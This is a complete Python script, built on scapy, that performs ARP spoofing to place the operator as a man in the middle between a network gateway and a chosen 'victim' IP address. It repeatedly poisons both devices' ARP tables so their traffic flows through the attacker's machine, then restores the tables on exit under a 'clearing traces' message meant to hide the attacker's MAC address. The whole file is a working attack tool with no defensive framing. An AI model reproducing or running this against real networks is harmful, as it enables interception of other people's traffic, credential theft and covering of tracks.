#!/usr/bin/env python3
# -.- coding: utf-8 -.-

from sys import exit
from time import sleep
from scapy.all import ARP, send, sr
import argparse


def passed_args():
    '''
        Returns whatever passed as arguments, if nothing passed, gateway and
        victim will be assigned to None.
    '''

    parser = argparse.ArgumentParser()
    parser.add_argument('-g', '--gatway', dest='gateway',
                        help="Gateway's IP address")
    parser.add_argument('-v', '--victim', dest='victim',
                        help="Victims's IP address")
    data = parser.parse_args()
    return data


def get_mac(device):
    '''
        Send an ARP packet to the desired IP address, wait for an answer,
        return answer\'s MAC address.
    '''

    arp_request = ARP(pdst=device)
    answered = None
    while not answered:
        answered, not_answered = sr(arp_request, verbose=False, timeout=1)
        sleep(0.3)

    for answer in answered:
        return answer[1].hwsrc


def spoof(device, pretending):
    '''
        Send an ARP packet to a device with your machine\'s MAC address
        associated with the desired IP address.

        Whenever victim\'s machine sends a packet to the IP you've spoofed,
        it will send it to you instead of the meant destination.
    '''

    # our MAC will be added automatically
    arp_response = ARP(op=2,
                       pdst=device,
                       hwdst=get_mac(device),
                       psrc=pretending)
    send(arp_response, verbose=False)


def unspoof(device, pretended):
    '''
        Send an ARP packet with the right MAC address of the spoofed IP, to
        hide your MAC address after the execution.
    '''

    arp_response = ARP(op=2,
                       pdst=device,
                       hwdst=get_mac(device),
                       psrc=pretended,
                       hwsrc=get_mac(pretended))

    send(arp_response, verbose=False)


def main():
    _count = 0
    data = passed_args()
    if not data.gateway or not data.victim:
        try:
            gateway = input("Gateway's IP: ")
            victim = input("Victim's IP: ")
        except Exception as e:
            print(e)
            print("Exiting...")
            sleep(5)
            exit()
    elif data.gateway and data.victim:
        gateway = data.gateway
        victim = data.victim
    try:
        while 1:
            _count += 2

            # Updating gateway's ARP table with
            # vicitim's IP and our MAC address
            spoof(gateway, victim)

            # Updating vicitim's ARP table with
            # gateway's IP and our MAC address
            spoof(victim, gateway)
            print(f"\r[+] Being man in the middle | Packets sent: {_count}",
                  end="")

            sleep(1)
    except KeyboardInterrupt:
        print("\n[-] Stop signal detected...")
        print("\n[-] Clearing traces...")
        # Updating gateway's ARP table with vicitim's IP and MAC address
        unspoof(gateway, victim)
        # Updating vicitim's ARP table with gateway's IP and MAC address
        unspoof(victim, gateway)
        print("[-] Man in the middle has been stopped successfully.")
        print("[-] Exiting...")
        sleep(5)
        exit()


if __name__ == "__main__":
    main()
